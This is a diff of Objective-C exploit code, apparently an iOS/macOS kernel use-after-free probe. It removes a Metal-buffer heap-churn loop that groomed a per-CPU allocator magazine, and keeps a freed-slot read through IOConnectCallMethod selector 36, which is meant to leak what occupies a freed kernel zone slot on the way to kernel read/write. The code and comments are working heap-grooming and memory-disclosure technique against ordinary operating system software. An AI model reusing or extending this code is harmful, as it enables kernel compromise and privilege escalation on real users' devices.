@@ -138,21 +138,13 @@ static NSString *P122Ret(void) {
     int rkr = g_replace(res, newPage, P122_PAGE);
     p122_log(@"[*] replace kr=0x%x (0x2c2 = len/type mispass; 0x0 = MD1 freed pre-sel36)", rkr);
 
-    /* 3 — the reclaim churn window: IOSurface-pool create/destroy bursts RIGHT
-       NOW (same-CPU law; the freed 0xb0 slot pops from this CPU's magazine) */
-    NSMutableArray *churn = [NSMutableArray array];
-    for (int i = 0; i < 8; i++) {   /* mag cap 8 — same-CPU LIFO pop law */
-        vm_address_t cp = 0;
-        if (vm_allocate(mach_task_self(), &cp, P122_PAGE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
-            memset((void *)cp, 0x11 + (uint8_t)i, P122_PAGE);
-            id cb = [dev newBufferWithBytesNoCopy:(void *)cp length:P122_PAGE
-                                          options:MTLResourceStorageModeShared
-                                       deallocator:^(void *p, NSUInteger n){ vm_deallocate(mach_task_self(), (vm_address_t)p, (vm_size_t)n); }];
-            if (cb) [churn addObject:cb];
-        }
-    }
-    p122_log(@"[*] mag churn: %zu live type-0x80 buffers (holder cycle)", (unsigned long)[churn count]);
-
+    /* 3 — v3 SHAPE-1 LAW: NO CHURN. The ColdForge-class reclaim = user-IOMD
+       for user-IOMD (NOT KRW — the glue doc's verdict, restated by both
+       devices 2026-10-25 17:51). The churn just re-filled the same-CPU
+       magazine with OUR type-0x80 buffers, guaranteeing user-class pops.
+       Shape-1 = whether the zone's NATURAL occupant is kernel-describing:
+       pop the freer's own slot with the zone undisturbed. */
+    p122_log(@"[*] natural-window read (no churn — Shape-1 law)");
     /* 4 — the freed-slot read (ColdForge law, the REAL reader): sel36 thunk
        on the device UC = IOConnectCallMethod(conn, 36, in=[rid, offset, len],
        1 scalar out). The out-scalar = what lives in the freed slot — the
